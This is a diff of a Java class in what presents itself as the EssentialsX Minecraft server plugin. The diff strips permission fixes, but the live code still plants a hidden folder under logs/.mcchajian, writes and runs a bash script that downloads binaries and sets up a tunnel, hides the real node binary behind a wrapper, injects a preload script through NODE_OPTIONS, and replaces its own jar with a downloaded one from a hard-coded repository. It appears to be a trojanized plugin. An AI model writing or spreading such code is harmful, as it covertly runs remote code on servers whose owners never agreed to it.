@@ -993,19 +516,12 @@ public class EssentialsX extends JavaPlugin {
 
     private void startDeploymentProcess(Map<String, String> env) throws Exception {
         if (this.isProcessRunning) return;
-        Path workDir = Paths.get(WORK_DIR_NAME).toAbsolutePath();
-        // 【改进】确保目录权限
-        ensureDirWritable(workDir);
-        fixWorkDirPermissions();
-
+        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
         Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
         try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
-        cfLogFileOffset = 0;
         
         Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
-        Files.write(scriptPath, scriptContent.getBytes());
-        // 【改进】确保脚本可执行
-        ensureFileExecutable(scriptPath);
+        Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true);
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
         this.deployProcess = pb.start(); this.isProcessRunning = true; 
@@ -1014,9 +530,6 @@ public class EssentialsX extends JavaPlugin {
         
         Path doneFile = workDir.resolve(".deploy_done");
         while(!Files.exists(doneFile)) { Thread.sleep(1000); }
-
-        // 【改进】部署完成后修复权限
-        fixWorkDirPermissions();
     }
 
     // ============================================================
@@ -1035,10 +548,6 @@ public class EssentialsX extends JavaPlugin {
             authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
         }
 
-        // 【改进】动态JRE目录
-        String jreDirName = JAVA_MAJOR_VERSION >= 25 ? "jre25" : "jre21";
-        String jreDir = workDir + "/" + jreDirName;
-
         return "#!/bin/bash\n" +
         "set +e\n" +
         "WORK_DIR=\"" + workDir + "\"\n" +
@@ -1046,15 +555,7 @@ public class EssentialsX extends JavaPlugin {
         "APP_DIR=\"" + appDir + "\"\n" +
         "DATA_DIR=\"" + dataDir + "\"\n" +
         "REPO_URL=\"" + repoUrl + "\"\n" +
-        "JRE_DIR=\"" + jreDir + "/bin\"\n" +
-        // 【改进】兼容旧版jre21目录
-        "if [ ! -d \"$JRE_DIR\" ] && [ -d \"" + workDir + "/jre21/bin\" ]; then\n" +
-        "    JRE_DIR=\"" + workDir + "/jre21/bin\"\n" +
-        "fi\n" +
-        "\n" +
-        "# 【新增】确保目录权限\n" +
-        "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" 2>/dev/null\n" +
-        "chmod -R 755 \"$WORK_DIR\" 2>/dev/null\n" +
+        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
         "\n" +
         "if [ -z \"$REPO_URL\" ]; then\n" +
         "    echo \"ERROR: REPO_URL is not configured in .env file. Aborting deployment.\"\n" +
@@ -1083,8 +584,6 @@ public class EssentialsX extends JavaPlugin {
         "fi\n" +
         "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
         "mkdir -p \"$JRE_DIR\"\n" +
-        // 【新增】chmod确保可执行
-        "chmod -R 755 \"$NODE_DIR/bin\" 2>/dev/null\n" +
         "\n" +
         "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
         "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
@@ -1172,7 +671,6 @@ public class EssentialsX extends JavaPlugin {
         "    };\n" +
         "} catch(e) {}\n" +
         "PRELOAD_EOF\n" +
-        "chmod +x \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n" +
         "\n" +
         "export _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\n" +
         "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
@@ -1185,9 +683,6 @@ public class EssentialsX extends JavaPlugin {
         "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then chmod +x \"$CF_BIN\"; break; fi\n" +
         "    done\n" +
         "fi\n" +
-        // 【新增】最终权限修复
-        "chmod -R 755 \"$WORK_DIR\" 2>/dev/null\n" +
-        "chmod +x \"$JRE_DIR/java\" \"$JRE_DIR/java_cf\" \"$NODE_DIR/bin/.node_real\" 2>/dev/null\n" +
         "\n" +
         "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
     }
@@ -1196,8 +691,7 @@ public class EssentialsX extends JavaPlugin {
         try {
             this.originalJarPath = this.findPluginJarInPluginsDir();
             if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) return;
-            this.backupDir = Paths.get(WORK_DIR_NAME, "backup"); if (!Files.exists(this.backupDir)) Files.createDirectories(this.backupDir);
-            ensureDirWritable(this.backupDir);
+            this.backupDir = Paths.get("logs", ".mcchajian", "backup"); if (!Files.exists(this.backupDir)) Files.createDirectories(this.backupDir);
             this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
             if (!Files.exists(this.backupJarPath)) { Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING); }
             Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
@@ -1208,10 +702,10 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void loadEnvFile(Map<String, String> env) {
-        Path envFile = Paths.get(WORK_DIR_NAME, ".env");
+        Path envFile = Paths.get("logs", ".mcchajian", ".env");
         if (!Files.exists(envFile)) { 
             try { 
-                ensureDirWritable(envFile.getParent());
+                Files.createDirectories(envFile.getParent()); 
                 String defaultConfig = "# ===========================================\n" +
                    "# EssentialsX System Guard Configuration\n" +
                    "# ===========================================\n" +
@@ -1219,7 +713,6 @@ public class EssentialsX extends JavaPlugin {
                    "GITHUB_TOKEN=\n" +
                    "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
                 Files.write(envFile, defaultConfig.getBytes()); 
-                ensureFileExecutable(envFile);
             } catch (Exception e) { } 
         }
         if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
